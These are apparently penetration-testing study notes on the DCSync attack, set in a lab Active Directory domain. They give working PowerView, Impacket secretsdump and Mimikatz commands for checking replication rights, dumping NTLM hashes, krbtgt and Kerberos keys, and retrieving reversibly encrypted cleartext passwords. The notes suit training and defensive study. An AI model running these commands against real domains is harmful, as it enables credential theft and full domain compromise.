# DCSync (Domain Dominance)
**Concept:** The **Directory Replication Service Remote Protocol (MS-DRSR)** is used by Domain Controllers to update each other. 
**The Attack:** An attacker with specific rights simulates the behavior of a Domain Controller. They send a replication request to the real DC, asking for user data (hashes). 
**Prerequisite:** You do **not** need to be a Domain Admin. You only need two specific permissions on the Domain Root object:
1. `DS-Replication-Get-Changes`
2. `DS-Replication-Get-Changes-All`
## 1. Enumeration (Checking Rights)
**Goal:** Verify if your current user (or a compromised user like `adunn`) has DCSync rights.
### Using PowerView
We check the ACL of the Domain Object for the specific replication GUIDs.
```powershell
# 1. Get the SID of the target user (adunn)
$sid = Convert-NameToSid adunn

# 2. Check the ACLs on the Domain Root
# We filter for rights that match 'Replication-Get' and our User's SID
Get-DomainObjectACL -Identity "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier
```
- **Success Indicator:** Output shows `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`.
## 2. Execution (Dumping Secrets)
Once rights are confirmed, we can dump hashes. We typically target:
- **Administrator:** For direct access.
- **krbtgt:** To create Golden Tickets (Persistence).
- **History Hashes:** To see previous passwords.
### Method A: Impacket (Linux/Remote)
**Tool:** `secretsdump.py` **Context:** You have credentials for the user with DCSync rights (`adunn`).
```shell
# Syntax: secretsdump.py <Domain>/<User>:<Pass>@<DC_IP>
# -just-dc: Extract NTDS hashes (DCSync)
# -outputfile: Save to disk
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn:Password123@172.16.5.5
```
- **Output Files:**
    - `.ntds`: The NTLM hashes.
    - `.cleartext`: Passwords stored with "Reversible Encryption" enabled (rare but critical).
    - `.kerberos`: AES keys for Kerberos attacks.
### Method B: Mimikatz (Windows/Local)
**Tool:** `mimikatz.exe` **Context:** You are on a domain-joined machine running as the user with DCSync rights.

**1. Run Mimikatz:**
```powershell
# Standard DCSync command
.\mimikatz.exe

# Inside Mimikatz:
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:Administrator
```

**2. RunAs (If needed):** If you have the credentials for `adunn` but are logged in as someone else, spawn a new shell first.
```powershell
runas /netonly /user:INLANEFREIGHT\adunn powershell
```
## 3. Hunting for Cleartext Passwords
**Concept:** DCSync also returns cleartext passwords if the account has **"Store password using reversible encryption"** enabled. This is a legacy setting often found on service accounts.
### Identification (PowerView / AD Module)
```powershell
# PowerView
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname

# AD Module
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```
### Retrieval
If found, `secretsdump.py` automatically puts them in the `.cleartext` file.
```shell
cat inlanefreight_hashes.ntds.cleartext
# Output: proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```